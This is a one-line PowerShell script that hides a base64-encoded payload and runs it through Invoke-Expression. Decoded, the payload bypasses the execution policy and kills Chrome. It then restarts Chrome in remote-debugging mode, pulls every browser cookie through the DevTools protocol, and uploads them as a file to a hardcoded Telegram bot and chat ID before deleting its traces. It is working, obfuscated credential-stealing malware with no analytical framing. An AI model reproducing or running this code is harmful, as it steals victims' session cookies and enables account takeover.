$e = [System.Convert]::FromBase64String('IyBCeXBhc3MgRXhlY3V0aW9uIFBvbGljeQ0KdHJ5IHsNCiAgICBXcml0ZS1Ib3N0ICJCeXBhc3NpbmcgRXhlY3V0aW9uIFBvbGljeS4uLiINCiAgICBTZXQtRXhlY3V0aW9uUG9saWN5IC1TY29wZSBQcm9jZXNzIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1Gb3JjZSAjIEFsbG93cyB0aGUgc2NyaXB0IHRvIHJ1biBieXBhc3NpbmcgdGhlIGRlZmF1bHQgZXhlY3V0aW9uIHBvbGljaWVzLg0KICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDENCiAgICBXcml0ZS1Ib3N0ICJCeXBhc3NlZCEiIC1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4NCn0gY2F0Y2ggew0KICAgIFdyaXRlLUhvc3QgIkVycm9yOiBVbmFibGUgdG8gQnlwYXNzIEV4ZWN1dGlvbiBQb2xpY3kuIFByb2NlZWRpbmcgd2l0aG91dCBCeXBhc3MuIiAtRm9yZWdyb3VuZENvbG9yIFJlZA0KfQ0KDQpXcml0ZS1Ib3N0ICJDcmVhdGVkIGJ5IEBrcnl5YWFzb2Z0IiAtRm9yZWdyb3VuZENvbG9yIEJsdWUNCldyaXRlLUhvc3QgIkNyZWF0ZWQgYnkgQGtyeXlhYXNvZnQiIC1Gb3JlZ3JvdW5kQ29sb3IgR3JlZW4NCldyaXRlLUhvc3QgIkNyZWF0ZWQgYnkgQGtyeXlhYXNvZnQiIC1Gb3JlZ3JvdW5kQ29sb3IgQmx1ZQ0KV3JpdGUtSG9zdCAiQ3JlYXRlZCBieSBAa3J5eWFhc29mdCIgLUZvcmVncm91bmRDb2xvciBHcmVlbg0KV3JpdGUtSG9zdCAiQ3JlYXRlZCBieSBAa3J5eWFhc29mdCIgLUZvcmVncm91bmRDb2xvciBCbHVlDQpXcml0ZS1Ib3N0ICJDcmVhdGVkIGJ5IEBrcnl5YWFzb2Z0IiAtRm9yZWdyb3VuZENvbG9yIEdyZWVuDQpXcml0ZS1Ib3N0ICJDcmVhdGVkIGJ5IEBrcnl5YWFzb2Z0IiAtRm9yZWdyb3VuZENvbG9yIEJsdWUNCg0KZnVuY3Rpb24gU2VuZC1GaWxlVG9UZWxlZ3JhbSB7DQogICAgcGFyYW0gKA0KICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSldDQogICAgICAgIFtzdHJpbmddJEZpbGVQYXRoLA0KICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSldDQogICAgICAgIFtzdHJpbmddJENoYXRJZCwNCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUpXQ0KICAgICAgICBbc3RyaW5nXSRCb3RUb2tlbg0KICAgICkNCg0KICAgICR1cmwgPSAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCRCb3RUb2tlbi9zZW5kRG9jdW1lbnQiDQogICAgJGZpbGVDb250ZW50ID0gR2V0LUNvbnRlbnQgLVBhdGggJEZpbGVQYXRoIC1SYXcNCg0KICAgIHRyeSB7DQogICAgICAgICRib3VuZGFyeSA9IFtTeXN0ZW0uR3VpZF06Ok5ld0d1aWQoKS5Ub1N0cmluZygpDQogICAgICAgICRoZWFkZXJzID0gQHsNCiAgICAgICAgICAgICJDb250ZW50LVR5cGUiID0gIm11bHRpcGFydC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSRib3VuZGFyeSINCiAgICAgICAgfQ0KDQogICAgICAgICRib2R5TGluZXMgPSBAKA0KICAgICAgICAgICAgIi0tJGJvdW5kYXJ5IiwNCiAgICAgICAgICAgICJDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9YCJjaGF0X2lkYCIiLA0KICAgICAgICAgICAgIiIsDQogICAgICAgICAgICAkQ2hhdElkLA0KICAgICAgICAgICAgIi0tJGJvdW5kYXJ5IiwNCiAgICAgICAgICAgICJDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9YCJkb2N1bWVudGAiOyBmaWxlbmFtZT1gIiQoU3BsaXQtUGF0aCAkRmlsZVBhdGggLUxlYWYpYCIiLA0KICAgICAgICAgICAgIkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24vanNvbiIsDQogICAgICAgICAgICAiIiwNCiAgICAgICAgICAgICRmaWxlQ29udGVudCwNCiAgICAgICAgICAgICItLSRib3VuZGFyeS0tIg0KICAgICAgICApDQoNCiAgICAgICAgJGJvZHkgPSAkYm9keUxpbmVzIC1qb2luICJgcmBuIg0KICAgICAgICAkcmVzcG9uc2UgPSBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICR1cmwgLU1ldGhvZCBQb3N0IC1IZWFkZXJzICRoZWFkZXJzIC1Cb2R5ICRib2R5DQogICAgICAgIFdyaXRlLUhvc3QgIkZpbGUgc2VudCB0byBUZWxlZ3JhbTogJCgkcmVzcG9uc2Uub2spIg0KICAgIH0gY2F0Y2ggew0KICAgICAgICBXcml0ZS1FcnJvciAiRmFpbGVkIHRvIHNlbmQgZmlsZSB0byBUZWxlZ3JhbTogJF8iDQogICAgfQ0KfQ0KDQokcmVtb3RlRGVidWdnaW5nUG9ydCA9IDkyMjINCiRVUkwgPSAiaHR0cHM6Ly9nb29nbGUuY29tIg0KDQpmdW5jdGlvbiBxdWl0eCgpew0KICAgIGlmIChHZXQtUHJvY2VzcyAtTmFtZSAiY2hyb21lIiAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkgew0KICAgICAgICBTdG9wLVByb2Nlc3MgLU5hbWUgImNocm9tZSIgLUZvcmNlDQogICAgfQ0KfQ0KDQpmdW5jdGlvbiBTZW5kUmVjZWl2ZVdlYlNvY2tldE1lc3NhZ2Ugew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10gJFdlYlNvY2tldFVybCwNCiAgICAgICAgW3N0cmluZ10gJE1lc3NhZ2UNCiAgICApDQoNCiAgICB0cnkgew0KICAgICAgICAkV2ViU29ja2V0ID0gW1N5c3RlbS5OZXQuV2ViU29ja2V0cy5DbGllbnRXZWJTb2NrZXRdOjpuZXcoKQ0KICAgICAgICAkQ2FuY2VsbGF0aW9uVG9rZW4gPSBbU3lzdGVtLlRocmVhZGluZy5DYW5jZWxsYXRpb25Ub2tlbl06Ok5vbmUNCiAgICAgICAgJGNvbm5lY3RUYXNrID0gJFdlYlNvY2tldC5Db25uZWN0QXN5bmMoW1N5c3RlbS5VcmldICRXZWJTb2NrZXRVcmwsICRDYW5jZWxsYXRpb25Ub2tlbikNCiAgICAgICAgW3ZvaWRdJGNvbm5lY3RUYXNrLlJlc3VsdA0KICAgICAgICBpZiAoJFdlYlNvY2tldC5TdGF0ZSAtbmUgW1N5c3RlbS5OZXQuV2ViU29ja2V0cy5XZWJTb2NrZXRTdGF0ZV06Ok9wZW4pIHsNCiAgICAgICAgICAgIHRocm93ICJXZWJTb2NrZXQgY29ubmVjdGlvbiBmYWlsZWQuIFN0YXRlOiAkKCRXZWJTb2NrZXQuU3RhdGUpIg0KICAgICAgICB9DQogICAgICAgICRtZXNzYWdlQnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCRNZXNzYWdlKQ0KICAgICAgICAkYnVmZmVyID0gW1N5c3RlbS5BcnJheVNlZ21lbnRbYnl0ZV1dOjpuZXcoJG1lc3NhZ2VCeXRlcykNCiAgICAgICAgJHNlbmRUYXNrID0gJFdlYlNvY2tldC5TZW5kQXN5bmMoJGJ1ZmZlciwgW1N5c3RlbS5OZXQuV2ViU29ja2V0cy5XZWJTb2NrZXRNZXNzYWdlVHlwZV06OlRleHQsICR0cnVlLCAkQ2FuY2VsbGF0aW9uVG9rZW4pDQogICAgICAgIFt2b2lkXSRzZW5kVGFzay5SZXN1bHQNCiAgICAgICAgJHJlY2VpdmVkRGF0YSA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtieXRlXQ0KICAgICAgICAkUmVjZWl2ZUJ1ZmZlciA9IE5ldy1PYmplY3QgYnl0ZVtdIDQwOTYgIyBBZGp1c3QgdGhlIGJ1ZmZlciBzaXplIGFzIG5lZWRlZA0KICAgICAgICAkUmVjZWl2ZUJ1ZmZlclNlZ21lbnQgPSBbU3lzdGVtLkFycmF5U2VnbWVudFtieXRlXV06Om5ldygkUmVjZWl2ZUJ1ZmZlcikNCg0KICAgICAgICB3aGlsZSAoJHRydWUpIHsNCiAgICAgICAgICAgICRyZWNlaXZlUmVzdWx0ID0gJFdlYlNvY2tldC5SZWNlaXZlQXN5bmMoJFJlY2VpdmVCdWZmZXJTZWdtZW50LCAkQ2FuY2VsbGF0aW9uVG9rZW4pDQogICAgICAgICAgICBpZiAoJHJlY2VpdmVSZXN1bHQuUmVzdWx0LkNvdW50IC1ndCAwKSB7DQogICAgICAgICAgICAgICAgJHJlY2VpdmVkRGF0YS5BZGRSYW5nZShbYnl0ZVtdXSgkUmVjZWl2ZUJ1ZmZlclNlZ21lbnQuQXJyYXkpWzAuLigkcmVjZWl2ZVJlc3VsdC5SZXN1bHQuQ291bnQgLSAxKV0pDQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAoJHJlY2VpdmVSZXN1bHQuUmVzdWx0LkVuZE9mTWVzc2FnZSkgew0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgJFJlY2VpdmVkTWVzc2FnZSA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKCRyZWNlaXZlZERhdGEuVG9BcnJheSgpKQ0KICAgICAgICAkV2ViU29ja2V0LkNsb3NlQXN5bmMoW1N5c3RlbS5OZXQuV2ViU29ja2V0cy5XZWJTb2NrZXRDbG9zZVN0YXR1c106Ok5vcm1hbENsb3N1cmUsICJXZWJTb2NrZXQgY2xvc2VkIiwgJENhbmNlbGxhdGlvblRva2VuKQ0KICAgICAgICByZXR1cm4gJFJlY2VpdmVkTWVzc2FnZQ0KICAgIH0gY2F0Y2ggew0KICAgICAgICB0aHJvdyAkXw0KICAgIH0NCn0NCg0KcXVpdHgNCg0KIyR1c2VybmFtZSA9ICRlbnY6VVNFUk5BTUUNCiRjaHJvbWVQYXRoID0gIkM6XFByb2dyYW0gRmlsZXNcR29vZ2xlXENocm9tZVxBcHBsaWNhdGlvblxjaHJvbWUuZXhlIg0KJHByb2Nlc3MgPSBTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkY2hyb21lUGF0aCAtQXJndW1lbnRMaXN0ICRVUkwsICItLXJlbW90ZS1kZWJ1Z2dpbmctcG9ydD0kcmVtb3RlRGVidWdnaW5nUG9ydCIsICItLXJlbW90ZS1hbGxvdy1vcmlnaW5zPXdzOi8vbG9jYWxob3N0OiRyZW1vdGVEZWJ1Z2dpbmdQb3J0Ig0KJGpzb25VcmwgPSAiaHR0cDovL2xvY2FsaG9zdDokcmVtb3RlRGVidWdnaW5nUG9ydC9qc29uIg0KJGpzb25EYXRhID0gSW52b2tlLVJlc3RNZXRob2QgLVVyaSAkanNvblVybCAtTWV0aG9kIEdldA0KJHVybF9jYXB0dXJlID0gJGpzb25EYXRhLndlYlNvY2tldERlYnVnZ2VyVXJsDQokTWVzc2FnZSA9ICd7ImlkIjogMSwibWV0aG9kIjoiTmV0d29yay5nZXRBbGxDb29raWVzIn0nDQoNCmlmICgkdXJsX2NhcHR1cmVbMF0uTGVuZ3RoIC1nZSAyKSB7DQogICAgJHJlc3BvbnNlID0gU2VuZFJlY2VpdmVXZWJTb2NrZXRNZXNzYWdlIC1XZWJTb2NrZXRVcmwgJHVybF9jYXB0dXJlWzBdIC1NZXNzYWdlICRNZXNzYWdlDQp9IGVsc2Ugew0KICAgICRyZXNwb25zZSA9IFNlbmRSZWNlaXZlV2ViU29ja2V0TWVzc2FnZSAtV2ViU29ja2V0VXJsICR1cmxfY2FwdHVyZSAtTWVzc2FnZSAkTWVzc2FnZQ0KfQ0KDQojINCY0LfQstC70LXQutCw0LXQvCBKU09OLdGH0LDRgdGC0Ywg0LjQtyDQvtGC0LLQtdGC0LAg0YEg0L/QvtC80L7RidGM0Y4g0YDQtdCz0YPQu9GP0YDQvdC+0LPQviDQstGL0YDQsNC20LXQvdC40Y8NCnRyeSB7DQogICAgIyDQmNGB0L/QvtC70YzQt9GD0LXQvCDRgNC10LPRg9C70Y/RgNC90L7QtSDQstGL0YDQsNC20LXQvdC40LUg0LTQu9GPINC/0L7QuNGB0LrQsCBKU09OINCyINC+0YLQstC10YLQtQ0KICAgICRqc29uUGF0dGVybiA9ICdcey4qXH0nDQogICAgJGpzb25NYXRjaCA9IFtyZWdleF06Ok1hdGNoKCRyZXNwb25zZSwgJGpzb25QYXR0ZXJuKQ0KICAgIGlmICgkanNvbk1hdGNoLlN1Y2Nlc3MpIHsNCiAgICAgICAgJGpzb25SZXNwb25zZSA9ICRqc29uTWF0Y2guVmFsdWUgfCBDb252ZXJ0RnJvbS1Kc29uDQogICAgICAgIGlmICgkanNvblJlc3BvbnNlIC1hbmQgJGpzb25SZXNwb25zZS5yZXN1bHQpIHsNCiAgICAgICAgICAgICRqc29uUmVzcG9uc2UgPSAkanNvblJlc3BvbnNlLnJlc3VsdA0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgdGhyb3cgIkludmFsaWQgSlNPTiByZXNwb25zZTogJGpzb25SZXNwb25zZSINCiAgICAgICAgfQ0KICAgIH0gZWxzZSB7DQogICAgICAgIHRocm93ICJObyBKU09OIGZvdW5kIGluIHRoZSByZXNwb25zZS4iDQogICAgfQ0KfSBjYXRjaCB7DQogICAgV3JpdGUtRXJyb3IgIkZhaWxlZCB0byBwYXJzZSBKU09OIHJlc3BvbnNlOiAkXyINCiAgICBleGl0IDENCn0NCg0KIyDQodC+0YXRgNCw0L3Rj9C10LwgSlNPTiDQsiDRhNCw0LnQuw0KJHRlbXBGaWxlUGF0aCA9ICIkZW52OlRFTVBcQ29va2llcy5qc29uIg0KJGpzb25SZXNwb25zZSB8IENvbnZlcnRUby1Kc29uIC1EZXB0aCAxMCB8IE91dC1GaWxlIC1GaWxlUGF0aCAkdGVtcEZpbGVQYXRoIC1FbmNvZGluZyBVVEY4DQoNCiMg0J7RgtC/0YDQsNCy0LrQsCDRhNCw0LnQu9CwINCyIFRlbGVncmFtDQokYm90VG9rZW4gPSAiNzY3NzM4Njc0MTpBQUZyZzVmTTdwQlBjR2VsanNQSTlCeHlIQXhYc0J6b1dsOCIgICMg0JfQsNC80LXQvdC40YLQtSDQvdCwINCy0LDRiCDRgtC+0LrQtdC9INCx0L7RgtCwDQokY2hhdElkID0gIjE1MjExMzIxMjciICAgICAjINCX0LDQvNC10L3QuNGC0LUg0L3QsCDQstCw0YggY2hhdF9pZA0KU2VuZC1GaWxlVG9UZWxlZ3JhbSAtRmlsZVBhdGggJHRlbXBGaWxlUGF0aCAtQ2hhdElkICRjaGF0SWQgLUJvdFRva2VuICRib3RUb2tlbg0KDQojINCj0LTQsNC70Y/QtdC8INCy0YDQtdC80LXQvdC90YvQuSDRhNCw0LnQuw0KUmVtb3ZlLUl0ZW0gLVBhdGggJHRlbXBGaWxlUGF0aCAtRm9yY2UNCg0KcXVpdHg='); $obfuscated = [System.Text.Encoding]::UTF8.GetString($e); Invoke-Expression $obfuscated